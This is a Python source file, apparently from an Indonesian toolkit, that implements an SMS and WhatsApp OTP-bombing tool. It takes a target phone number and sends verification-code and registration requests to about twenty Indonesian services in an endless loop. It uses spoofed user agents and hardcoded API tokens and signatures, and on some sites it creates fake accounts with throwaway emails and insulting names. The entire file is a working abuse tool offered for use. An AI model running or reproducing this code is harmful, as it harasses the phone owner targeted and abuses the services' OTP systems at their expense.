agent = random.choice(
			[
				"Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
				"Dalvik/1.6.0 (Linux; U; Android 4.1.1; BroadSign Xpress 1.0.14 B- (720) Build/JRO03H)",
				"Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; BroadSign Xpress 1.0.15-6 B- (720) Build/JRO03H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30","Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"
				"Mozilla/5.0 (Linux; Android 10; SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
		]
	)

def process_data1():
	sleep(0.10)
	
def spam_sms():
	global nomor 
	prints(Panel(f'''{P2}Contoh : {H2}+6281234567xxx''',width=80,padding=(0,8),style=f"{color_table}"))
	nomor = input(f"{N}input no hp :{N} +62").replace("+62","")
	if nomor == "":
		pass
	else:
		while True:
			for _ in track(range(100), description=f'{P2}tunggu sedang spam sms...'):process_data1()
			sxp_sms()

class sxp_sms:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def sms_otp_1(self, no):
		__req__ = self.req.post("https://service.mokapos.com/account/v1/verification/phone/send",
			headers = {
				  "accept": "application/json, text/plain, */*",
				  "authorization": "undefined",
				  "save-data": "on",
				  "user-agent": agent,
				  "content-type": "application/json;charset=UTF-8"
				},
			json = {
				 "phone_number": f"+62{no}"
			  }
		).text

	def sms_otp_2(self, no):
		data = json.dumps({
					"mobile": f"0{no}",
					"noise": "1583590641573155574",
					"request_time": "158359064157312",
					"access_token": "11111"
				   })
		__req__ = self.req.post("https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code",
			headers = {
				    "accept": "text/html, application/xhtml+xml, application/json, */*",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
				    "content-length": "166",
				    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
				    "origin": "https://h5.rupiahcepatweb.com",
				    "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
				    "sec-fetch-dest": "empty",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-site": "same-site",
				    "user-agent": agent
				  },
			data = {
				 "data": data
			   }
		).text

	def sms_otp_3(self, no):
		__req__ = self.req.post("https://www.olx.co.id/api/auth/authenticate",
			headers = {
				    "accept": "*/*",
				    "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
				    "x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
				    "user-agent": agent,
				    "content-type": "application/json"
				  },
			json = {
				 "grantType": "retry",
				 "method": "sms",
				 "phone": no,
				 "language": "id"
				}
		).text

	def sms_otp_4(self, no):
		__req__ = self.req.post("https://www.alodokter.com/login-with-phone-number",
			headers = {
				    "user-agent": agent,
				    "content-type": "application/json",
				    "referer": "https://www.alodokter.com/login-alodokter",
				    "accept": "application/json",
				    "origin": "https://www.alodokter.com"
				  },
			json = {
				 "user":{
					  "phone": f"0{no}"
					}
				}
		).text

	def sms_otp_5(self, no):
		__req__ = self.req.post("https://www.kelaspintar.id/user/otpverification",
			headers = {
				    "x-requested-with": "XMLHttpRequest",
				    "User-Agent": agent,
				    "Referer": "https://www.kelaspintar.id/"
				  },
			data = {
				 "user_mobile": no,
				 "otp_type": "send_otp_reg",
				 "mobile_code": "%2B62"
				}
		).text

	def sms_otp_6(self, no):
		aink_sanz = random.choice(
						[
							"Hallo Mantan",
							"Hallo Bangsad",
							"Hallo Sayang",
							"Hallo Ripper",
							"Hallo Ngab"
						]
					)
		email = random.choice(
					[
						"nsnsmsmksksmsm@gmail.com",
						"lavon.lockman@gmail.com",
						"duane_mclaughlin38@gmail.com",
						"alfreda.lindgren@gmail.com",
						"leonardo_kuhlman@gmail.com",
						"lyric51@gmail.com",
						"devonte_littel@gmail.com",
						"newell.kuhic@gmail.com"
					]
				)
		pw = random.choice(
					[
						"mamsmms123",
						"Wadepak1037",
						"waifugw1011"
					]
				)
		birth_date = random.choice(
						[
							"13/09/1999",
							"04/02/2022",
							"05/02/2022",
							"05/02/2022",
							"06/02/2022",
							"10/02/2022"
						]
	)
		__req__ = self.req.post("https://www.matahari.com/rest/V1/thorCustomers",
			json = {
				"thor_customer":{
						"name": aink_sanz,
						"card_number": None,
						"email_address": email,
						"mobile_country_code": "+62",
						"gender_id": "1",
						"mobile_number": f"0{no}",
						"mro": "",
						"password": pw,
						"birth_date": birth_date
						}
				},
			headers = {
					"Host": "www.matahari.com",
					"x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
					"origin": "https://www.matahari.com",
					"user-agent": agent,
					"content-type": "application/json",
					"accept": "*/*",
					"x-requested-with": "XMLHttpRequest",
					"referer": "https://www.matahari.com/customer/account/create/",
					"accept-encoding": "gzip, deflate, br",
					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}

		).text

	def sms_otp_7(self, no):
		__req__ = self.req.post("https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
			headers = {
				    "Host": "api.duniagames.co.id",
				    "content-length": "32",
				    "accept": "application/json, text/plain, */*",
				    "x-device": "cc45ed83-73bd-4a98-83e3-874e8bc11a7f",
				    "accept-language": "id",
				    "user-agent": agent,
				    "ciam-type": "FR",
				    "content-type": "application/json",
				    "origin": "https://duniagames.co.id",
				    "sec-fetch-site": "same-site",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-dest": "empty",
				    "referer": "https://duniagames.co.id/",
				    "accept-encoding": "gzip, deflate, br"
				  },
			json = {
				 "phoneNumber": f"+62{no}"
				}
		).text

	def sms_otp_8(self, no):
		__req__ = self.req.post("https://harvestcakes.com/register",
			headers = {
				    "User-Agent": agent,
				    "Referer": "https://harvestcakes.com/register"
				  },
			data = {
				 "phone": f"0{no}",
				 "url": ""
				}
		).text

	def sms_otp_9(self, no):
		__req__ = self.req.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",
			headers = {
				    "Host": "identity-gateway.oyorooms.com",
				    "consumer_host": "https://www.oyorooms.com",
				    "accept-language": "id",
				    "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
				    "User-Agent": agent,
				    "Content-Type": "application/json",
				    "accept": "*/*",
				    "origin": "https://www.oyorooms.com",
				    "referer": "https://www.oyorooms.com/login",
				    "Accept-Encoding": "gzip, deflate, br"
				  },
			json = {
				 "phone": f"0{no}",
				 "country_code": "+62",
				 "country_iso_code": "ID",
				 "nod": "4",
				 "send_otp": "true",
				 "devise_role": "Consumer_Guest"
				}
		).text

	def sms_otp_10(self, no):
		__req__ = self.req.post("https://crp-app.stamps.co.id/api/auth/validate-mobile-number",
			json = {
				"mobile_number": f"0{no}",
				"token": "sI01tF5bOSYHabS7HaXiB1k3j0JxFxbcQ79Rd1HFBjKEKJqYAwSNMScsx9AEZq3O"
				},
			headers = {
					"Host": "crp-app.stamps.co.id",
					"content-type": "application/json; charset=utf-8",
					"content-length": "106",
					"accept-encoding": "gzip",
					"User-Agent": agent
			}
		).text

	def sms_otp_11(self, no):
		__req__ = self.req.post("https://app-api.kredito.id/client/v1/common/verify-code/send",
			headers = {
				    "LPR-TIMESTAMP": "1603281035821",
				    "Accept-Language": "id-ID",
				    "LPR-BRAND": "Kredito",
				    "LPR-PLATFORM": "android",
				    "User-Agent": agent,
				    "Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks",
				    "LPR-SIGNATURE": "e15dbea8602409df32a2ed5a123dc244",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Content-Length": "79"
				   },
			data = '{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}' % no
		).text

	def sms_otp_12(self, no):
		__req__ = self.req.post("https://www.autofun.co.id:443/v2/captcha/sms",
			headers = {
					"Host": "www.autofun.co.id",
					"Connection": "keep-alive",
					"Content-length": "84",
					"accept": "*/*",
					"User-Agent": agent,
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
					"content-type": "application/json;charset=UTF-8",
					"Origin": "https://www.autofun.co.id",
					"X-Requested-With": "acr.browser.barebones",
					"Sec-Fetch-Site": "same-origin",
					"Sec-Fetch-Mode": "cors",
					"Sec-Fetch-Dest": "empty",
					"Referer": "https://www.autofun.co.id/mobil/datsun",
					"Accept-Encoding": "gzip, deflate"
				},
			json = {
					"phoneNum": f"62{no}",
					"languageCode": "id-id",
					"countryCode": "id",
					"platform": 2
			}
		).text

	def sms_otp_13(self, no):
		__req__ = self.req.post("https://api.myfave.com/api/fave/v3/auth",
			json = {
					"phone":"+62"+no
				},
			headers = {
					"Host": "api.myfave.com",
					"Connection": "keep-alive",
					"x-user-agent": "Fave-PWA/v1.0.0",
					"Origin": "https://m.myfave.com",
					"User-Agent": agent,
					"content-type": "application/json",
					"Accept": "*/*",
					"Referer": "https://m.myfave.com/jakarta/auth",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
			}
		).text

	def sms_otp_14(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					)
		angka = random.randint(
					111,
					999
				      )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				  },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"62{no}",
				 "otp_type": "sms"
				}
		).text

	def main(self):
		self.sms_otp_1(nomor)
		self.sms_otp_2(nomor)
		self.sms_otp_3(nomor)
		self.sms_otp_4(nomor)
		self.sms_otp_5(nomor)
		self.sms_otp_6(nomor)
		self.sms_otp_7(nomor)
		self.sms_otp_8(nomor)
		self.sms_otp_9(nomor)
		self.sms_otp_10(nomor)
		self.sms_otp_11(nomor)
		self.sms_otp_12(nomor)
		self.sms_otp_13(nomor)
		self.sms_otp_14(nomor)
		prints(Panel(f"{P2}Sukses spam SMS ke no : {K2}+62{nomor}",width=80,padding=(0,2),style=f"{color_table}"))
        
def spam_wa():
	global nomor
	prints(Panel(f'''{P2}Contoh : {H2}+6281234567xxx''',width=80,padding=(0,8),style=f"{color_table}"))
	nomor = input(f"{N}input no hp :{N} +62").replace("+62","")
	if nomor == "":
		pass
	else:
		while True:
			for _ in track(range(100), description=f'{P2}tunggu sedang spam sms...'):process_data1()
			sxp_wa()
			
class sxp_wa:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def wa_otp_1(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					 )
		angka = random.randint(
					111,
					999
				       )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"0{no}",
				 "otp_type": "whatsapp"
				}
		).text

	def wa_otp_2(self, no):
		__req__ = self.req.get(
			f"https://m.redbus.id/api/getOtp?number={no}&cc=62&whatsAppOpted=true"
		).text

	def wa_otp_3(self, no):
		__req__ = self.req.post("https://api.bukuwarung.com/api/v1/auth/otp/send",
			headers = {
				    "Accept": "application/json",
				    "X-APP-VERSION-NAME": "3.4.0",
				    "X-APP-VERSION-CODE": "3399",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Host": "api.bukuwarung.com",
				    "Connection": "Keep-Alive",
				    "Accept-Encoding": "gzip",
				    "User-Agent": agent
				   },
			json = {
				 "action": "LOGIN_OTP",
				 "countryCode": "62",
				 "deviceId": "00000177-142d-f1a2-bac4-57a9039fdc4d",
				 "method": "WA",
				 "phone": no
				}
		).text

	def wa_otp_4(self, no):
		__req__ = self.req.post("https://evermos.com/api/client/request-code",
			headers = {
				    "user-agent": agent
				  },
			data = {
				 "telephone": f"62{no}",
				 "type": 0
				}
		).text

	def wa_otp_5(self, no):
		__req__ = self.req.post("https://wapi.ruparupa.com/auth/generate-otp",
			headers = {
				    "Host": "wapi.ruparupa.com",
				    "Connection": "keep-alive",
				    "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
				    "Accept": "application/json",
				    "Content-Type": "application/json",
				    "X-Company-Name": "odi",
				    "User-Agent": agent,
				    "user-platform": "mobile",
				    "X-Frontend-Type": "mobile",
				    "Origin": "https://m.ruparupa.com",
				    "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
				    "Accept-Encoding": "gzip, deflate, br",
				    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "phone": f"0{no}",
				 "action": "register",
				 "channel": "chat",
				 "email": "",
				 "customer_id": "0",
				 "is_resend": 0
				}
		).text

	def wa_otp_6(self, no):
		headers = {
			    "Connection": "keep-alive",
			    "Accept": "application/json, text/javascript, */*; q=0.01",
			    "Origin": "https://accounts.tokopedia.com",
			    "X-Requested-With": "XMLHttpRequest",
			    "User-Agent": agent,
			    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
			    "Accept-Encoding": "gzip, deflate",
			   }
		site = self.req.get("https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn="+ no +"&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D", headers = headers).text
		search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
		data = {
			 "otp_type": "116",
			 "msisdn": no,
			 "tk": search,
			 "email": "",
			 "original_param": "",
			 "user_id": "",
			 "signature": "",
			 "number_otp_digit": "6",
			}
		__req__ = self.req.post(
				"https://accounts.tokopedia.com/otp/c/ajax/request-wa", headers = headers, data = data
	   ).text

	def main(self):
		self.wa_otp_1(nomor)
		self.wa_otp_2(nomor)
		self.wa_otp_3(nomor)
		self.wa_otp_4(nomor)
		self.wa_otp_5(nomor)
		self.wa_otp_6(nomor)
		prints(Panel(f"{P2}Sukses spam WA ke no : {K2}+62{nomor}",width=80,padding=(0,2),style=f"{color_table}"))
        
def makedirectory():
	try:os.mkdir('data')
	except:pass
	try:os.system('result')
	except:pass
	login_kamu()

if __name__ == '__main__':
	os.system("git pull")
	makedirectory()
